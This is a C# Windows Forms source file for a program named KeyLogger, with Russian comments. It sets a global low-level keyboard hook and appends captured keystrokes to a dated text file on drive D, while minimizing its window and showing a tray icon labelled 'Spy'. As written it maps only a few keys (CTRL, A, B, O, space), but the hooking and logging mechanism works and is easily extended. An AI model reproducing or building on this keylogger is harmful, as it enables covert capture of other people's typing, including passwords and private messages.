using KeyLogger.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class MainForm : Form
    {
        // Иконка.
        private NotifyIcon notifyIcon = null;

        // Делегат.
        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        // Подключение библиотеки.
        // Функция для установки хука.
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(
            int idHook,
            LowLevelKeyboardProc callback,
            IntPtr hinstance,
            uint threadId);

        // Функция для снятия пользовательского хука.
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hinstance);

        // Функция для передачи сообщения для цепочки.
        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(
            IntPtr idHook,
            int nCode,
            int wParam,
            IntPtr lParam);

        // Функция для загрузки библиотек.
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        // Номер глобального LowLevel-хука на клавиатуру.
        const int WH_KEYBOARD_LL = 13;
        // Сообщение нажатия на клавишу.
        const int WM_KEYDOWN = 0x100;

        // Создаем callback делегат.
        private LowLevelKeyboardProc _proc = hookProc;

        // Создаем hook, и присваеваем ему значение 0.
        private static IntPtr hhook = IntPtr.Zero;

        

        private static IntPtr hookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Обработка нажатия.
            if(nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string dt = $"{DateTime.Now.ToShortDateString()}";

                string fileName = $"D:\\logger_{dt}.txt";
                if (!File.Exists(fileName))
                {
                    using (FileStream fs = File.Create(fileName)) {};
                }

                using (StreamWriter sw = new StreamWriter(fileName, append: true))
                {
                    // Раскладка Великобритании.
                     if (vkCode.ToString() == "162")
                    {
                        sw.Write("CTRL");
                    }
                    else if (vkCode.ToString() == "65")
                    {
                        sw.Write("A");
                    }
                    else if (vkCode.ToString() == "66")
                    {
                        sw.Write("B");
                    }
                    else if (vkCode.ToString() == "79")
                    {
                        sw.Write("O");
                    }
                    else if (vkCode.ToString() == "32")
                    {
                        sw.Write(" ");
                    }
                    sw.Close();
                }

                return (IntPtr)0;
            }
            else
            {
                return CallNextHookEx(hhook, nCode, (int)wParam, lParam);
            }
        }

        public MainForm()
        {
            InitializeComponent();

            this.Load += MainForm_Load;
            this.FormClosing += MainForm_FormClosing;
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnHook();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            //this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;

            notifyIcon = new NotifyIcon();
            notifyIcon.Icon = Resources.Spy;
            notifyIcon.Visible = true;

            SetHook();
        }

        public void SetHook()
        {
            IntPtr hinstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(
                WH_KEYBOARD_LL,
                _proc,
                hinstance,
                0);
        }

        public static void UnHook()
        {
            UnhookWindowsHookEx(hhook);
        }
    }
}
